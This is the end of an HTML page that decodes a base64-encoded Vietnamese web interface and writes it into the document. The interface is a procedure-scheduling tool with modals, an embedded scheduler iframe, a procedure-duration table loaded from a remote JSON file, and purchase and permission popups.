ob3coKTsNCiAgbmV3IE11dGF0aW9uT2JzZXJ2ZXIoc3luY1Nob3cpLm9ic2VydmUoZG9jdW1lbnQuYm9keSwgew0KICAgIGF0dHJpYnV0ZXM6IHRydWUsIHN1YnRyZWU6IHRydWUsIGF0dHJpYnV0ZUZpbHRlcjogWydzdHlsZScsJ2NsYXNzJ10NCiAgfSk7DQp9KTsNCg0KDQo8L3NjcmlwdD4NCjwhLS0gTW9kYWwgRnJhbWU6IFThuqFvIGdp4budIHRo4bunIHRodeG6rXQgLS0+DQo8ZGl2IGlkPSJwcm9jZWR1cmVGcmFtZU1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTA3MDsiPg0KICA8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVNjaGVkdWxlcigpIj48L2Rpdj4NCiAgPGRpdiBzdHlsZT0iDQogICAgICBwb3NpdGlvbjphYnNvbHV0ZTt0b3A6NCU7bGVmdDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSk7DQogICAgICB3aWR0aDptaW4oMTIwMHB4LDk2dncpO2hlaWdodDo5MHZoOw0KICAgICAgYmFja2dyb3VuZDojZmZmO2NvbG9yOiMwMDA7Ym9yZGVyLXJhZGl1czoxMHB4O2JvcmRlcjoycHggc29saWQgIzM0OThkYjsNCiAgICAgIGJveC1zaGFkb3c6MCA4cHggMjRweCByZ2JhKDAsMCwwLC4yNSk7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbiI+DQogICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjtwYWRkaW5nOjEwcHggMTJweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZTVlN2ViIj4NCiAgICAgIDxzdHJvbmc+VOG6oW8gZ2nhu50gdGjhu6cgdGh14bqtdDwvc3Ryb25nPg0KICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDo2cHgiPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9InJlbG9hZFByb2NlZHVyZVNjaGVkdWxlcigpInN0eWxlPSJwYWRkaW5nOjhweCAxNHB4O2ZvbnQtc2l6ZToxM3B4O2JvcmRlci1yYWRpdXM6NHB4OyI+TMOgbSBt4bubaTwvYnV0dG9uPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlUHJvY2VkdXJlU2NoZWR1bGVyKCkic3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7Zm9udC1zaXplOjEzcHg7Ym9yZGVyLXJhZGl1czo0cHg7Ij7EkMOzbmc8L2J1dHRvbj4NCiAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxpZnJhbWUgaWQ9InByb2NlZHVyZUZyYW1lIiBzcmM9ImFib3V0OmJsYW5rIiBzdHlsZT0iZmxleDoxO3dpZHRoOjEwMCU7Ym9yZGVyOjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT4NCiAgPC9kaXY+DQo8L2Rpdj48c2NyaXB0Pg0KICBmdW5jdGlvbiBvcGVuUHJvY2VkdXJlU2NoZWR1bGVyKCkgew0KICAgIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZUZyYW1lTW9kYWwnKTsNCiAgICBjb25zdCBmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVGcmFtZScpOw0KICAgIGZyYW1lLnNyYyA9ICdodHRwczovL2NoYXVodXluaDAxMDQuZ2l0aHViLmlvL2d5bS9sdHQuaHRtbCc7DQogICAgbW9kYWwuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0NCiAgZnVuY3Rpb24gcmVsb2FkUHJvY2VkdXJlU2NoZWR1bGVyKCkgew0KICAgIGNvbnN0IGZyYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZUZyYW1lJyk7DQogICAgaWYgKGZyYW1lICYmIGZyYW1lLmNvbnRlbnRXaW5kb3cpIHsNCiAgICAgIHRyeSB7IGZyYW1lLmNvbnRlbnRXaW5kb3cubG9jYXRpb24ucmVsb2FkKCk7IH0NCiAgICAgIGNhdGNoIChfKSB7IGZyYW1lLnNyYyA9IGZyYW1lLnNyYzsgfQ0KICAgIH0NCiAgfQ0KICBmdW5jdGlvbiBjbG9zZVByb2NlZHVyZVNjaGVkdWxlcigpIHsNCiAgICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVGcmFtZU1vZGFsJyk7DQogICAgY29uc3QgZnJhbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlRnJhbWUnKTsNCiAgICBmcmFtZS5zcmMgPSAnYWJvdXQ6YmxhbmsnOw0KICAgIG1vZGFsLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogIH0NCjwvc2NyaXB0Pg0KDQo8IS0tIFBPUFVQIFRV4buyIEJJ4bq+TiBUSOG7piBUSFXhuqxUIC0tPg0KPGRpdiBpZD0iY3VzdG9taXplTW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDYwOyI+DQogIDxkaXYgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiIG9uY2xpY2s9ImNsb3NlQ3VzdG9taXplUGFuZWwoKSI+PC9kaXY+DQogIDxkaXYgc3R5bGU9Ig0KICAgICAgcG9zaXRpb246YWJzb2x1dGU7dG9wOjglO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpOw0KICAgICAgd2lkdGg6bWluKDgyMHB4LDkydncpO21heC1oZWlnaHQ6ODR2aDtvdmVyZmxvdzphdXRvOw0KICAgICAgYmFja2dyb3VuZDojZmZmO2NvbG9yOiMwMDA7Ym9yZGVyLXJhZGl1czoxMHB4O2JvcmRlcjoycHggc29saWQgIzM0OThkYjsNCiAgICAgIGJveC1zaGFkb3c6MCA4cHggMjRweCByZ2JhKDAsMCwwLC4yNSk7Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZiI+DQogIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47DQogICAgICAgICAgICBwYWRkaW5nOjE0cHggMTZweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZTVlN2ViIj4NCiAgPGgzIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MThweCI+QuG6o25nIFR14buzIGJp4bq/biBUaOG7pyB0aHXhuq10PC9oMz4NCiAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6ZmxleC1lbmQ7Z2FwOjZweDsiPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9InNob3dOb1Blcm1pc3Npb24oKSINCiAgICAgICAgICBzdHlsZT0icGFkZGluZzo4cHggMTRweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIFRow6ptDQogIDwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlQ3VzdG9taXplUGFuZWwoKSINCiAgICAgICAgICBzdHlsZT0icGFkZGluZzo4cHggMTRweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIMSQw7NuZw0KICA8L2J1dHRvbj4NCjwvZGl2Pg0KPC9kaXY+DQogICAgPGRpdiBzdHlsZT0icGFkZGluZzowcHggMTZweCI+DQogICAgDQogICAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIiBzdHlsZT0id2lkdGg6MTAwJSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICA8dHI+DQogICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjYwcHgiPlNUVDwvdGg+DQogICAgICAgICAgICA8dGg+VGjhu6cgVGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjEzMHB4Ij5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjExMHB4Ij5DaHXhuqluIGLhu4s8L3RoPg0KICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keSBpZD0iY3VzdG9taXplQm9keSI+PC90Ym9keT4NCiAgICAgIDwvdGFibGU+DQogIA0KICA8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCiAgY29uc3QgVEhVVEhVQVRfVVJMID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9jaGF1X3RodXRodWF0LnR4dCc7DQoNCiAgYXN5bmMgZnVuY3Rpb24gb3BlbkN1c3RvbWl6ZVBhbmVsKCkgew0KICAgIHRyeSB7DQogICAgICBpZiAoIXdpbmRvdy5QUk9DRURVUkVTIHx8IE9iamVjdC5rZXlzKHdpbmRvdy5QUk9DRURVUkVTKS5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goVEhVVEhVQVRfVVJMKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIHdpbmRvdy5QUk9DRURVUkVTID0gSlNPTi5wYXJzZSh0ZXh0KTsNCiAgICAgIH0NCiAgICB9IGNhdGNoIChlKSB7DQogICAgICBhbGVydCgnS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2ggdGjhu6cgdGh14bqtdCB04burIG3DoXkgY2jhu6cuJyk7DQogICAgICByZXR1cm47DQogICAgfQ0KDQogICAgY29uc3Qgcm93cyA9IFtdOw0KICAgIE9iamVjdC5lbnRyaWVzKFBST0NFRFVSRVMpLmZvckVhY2goKFtuYW1lLCBjZmddKSA9PiB7DQogICAgICBpZiAoIW5hbWUgfHwgIWNmZykgcmV0dXJuOw0KDQogICAvLyB0csaw4bubYyDEkcOzOg0KbGV0IGR1cmF0aW9uID0gKHR5cGVvZiBjZmcuZHVyYXRpb24gPT09ICdudW1iZXInKSA/IGNmZy5kdXJhdGlvbiA6ICcnOw0KLy8gTuG6v3UgY8OzIHByZXAgdGjDrCBs4bqleSBwcmVwLCBu4bq/dSBraMO0bmcgY8OzIHRow6wgZ8OhbiA9IGR1cmF0aW9uDQpsZXQgcHJlcCA9ICh0eXBlb2YgY2ZnLnByZXAgPT09ICdudW1iZXInKSA/IGNmZy5wcmVwIDogZHVyYXRpb247DQoNCi8vIMOpcCByacOqbmcgY2hvICJT4bqvYyB0aHXhu5FjIHRoYW5nIg0KaWYgKG5hbWUudHJpbSgpLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoJ3Phuq9jIHRodeG7kWMgdGhhbmcnKSkgew0KICBkdXJhdGlvbiA9IDEyMDsNCiAgcHJlcCA9IDEyMDsNCn0NCg0KDQogICAgICBpZiAoZHVyYXRpb24gIT09ICcnKSB7DQogICAgICAgIHJvd3MucHVzaCh7IG5hbWUsIGR1cmF0aW9uLCBwcmVwIH0pOw0KICAgICAgfQ0KICAgIH0pOw0KDQogICAgcm93cy5zb3J0KChhLGIpID0+IGEubmFtZS5sb2NhbGVDb21wYXJlKGIubmFtZSwgJ3ZpJykpOw0KDQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3VzdG9taXplQm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9IHJvd3MubWFwKChyLCBpZHgpID0+IGANCiAgICAgIDx0cj4NCiAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+JHtpZHggKyAxfTwvdGQ+DQogICAgICAgIDx0ZD4ke3IubmFtZX08L3RkPg0KICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4ke3IuZHVyYXRpb259PC90ZD4NCiAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+JHtyLnByZXB9PC90ZD4NCiAgICAgIDwvdHI+DQogICAgYCkuam9pbignJyk7DQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3VzdG9taXplTW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgfQ0KDQogIGZ1bmN0aW9uIGNsb3NlQ3VzdG9taXplUGFuZWwoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZU1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgfQ0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KZnVuY3Rpb24gc2hvd05vUGVybWlzc2lvbigpIHsNCiAgLy8gT3ZlcmxheQ0KICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIG92ZXJsYXkuc3R5bGUuY3NzVGV4dCA9IGANCiAgICBwb3NpdGlvbjpmaXhlZDtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpOw0KICAgIGRpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjt6LWluZGV4OjEyMDAwOw0KICBgOw0KDQogIC8vIEJveA0KICBjb25zdCBib3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgYm94LnN0eWxlLmNzc1RleHQgPSBgDQogICAgYmFja2dyb3VuZDojZmZmO3BhZGRpbmc6MjBweCAzMHB4O2JvcmRlci1yYWRpdXM6MTBweDsNCiAgICB0ZXh0LWFsaWduOmNlbnRlcjttYXgtd2lkdGg6MzIwcHg7Ym94LXNoYWRvdzowIDRweCAxNXB4IHJnYmEoMCwwLDAsMC4zKTsNCiAgICBmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmOw0KICBgOw0KICBib3guaW5uZXJIVE1MID0gYA0KICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxOHB4O2ZvbnQtd2VpZ2h0OjYwMDtjb2xvcjojZTc0YzNjO21hcmdpbi1ib3R0b206MTBweDsiPg0KICAgICAg8J+aqyBC4bqhbiBraMO0bmcgY8OzIHF1eeG7gW4gdGjDqm0gdGjhu6cgdGh14bqtdA0KICAgIDwvZGl2Pg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZCh0aGlzLmNsb3Nlc3QoJy5ub1Blcm1PdmVybGF5JykpIj4NCiAgICAgIMSQw7NuZw0KICAgIDwvYnV0dG9uPg0KICBgOw0KICBvdmVybGF5LmNsYXNzTGlzdC5hZGQoIm5vUGVybU92ZXJsYXkiKTsNCiAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZSA9PiB7DQogICAgaWYgKGUudGFyZ2V0ID09PSBvdmVybGF5KSBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICB9KTsNCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCn0NCg0KDQoNCjwvc2NyaXB0Pg0KDQoNCg0KDQoNCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIGlmIChlLnRhcmdldCAmJiBlLnRhcmdldC5pZCA9PT0gImJ1eSIpIHsNCiAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgfQ0KfSk7DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGUpIHsNCiAgLy8gTeG7nyBwb3B1cCBi4bqjbmcgZ2nDoSBu4bq/dSBjbGljayB2w6BvIG7DunQgaWQ9YnV5DQogIGlmIChlLnRhcmdldCAmJiBlLnRhcmdldC5pZCA9PT0gImJ1eSIpIHsNCiAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICByZXR1cm47DQogIH0NCg0KICAvLyDEkMOzbmcgcG9wdXAga2hpIGNsaWNrIHJhIG5nb8OgaSBwaOG6p24gbuG7mWkgZHVuZw0KICBjb25zdCBwb3B1cHMgPSBbImJ1eVBvcHVwIiwgInBheW1lbnRQb3B1cCIsICJjb25maXJtUG9wdXAiXTsNCiAgcG9wdXBzLmZvckVhY2goaWQgPT4gew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpOw0KICAgIGlmIChwb3B1cCAmJiBwb3B1cC5zdHlsZS5kaXNwbGF5ID09PSAiZmxleCIgJiYgZS50YXJnZXQgPT09IHBvcHVwKSB7DQogICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIH0NCiAgfSk7DQp9KTsNCjwvc2NyaXB0Pg0KPC9odG1sPg==";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>
</body>
</html>
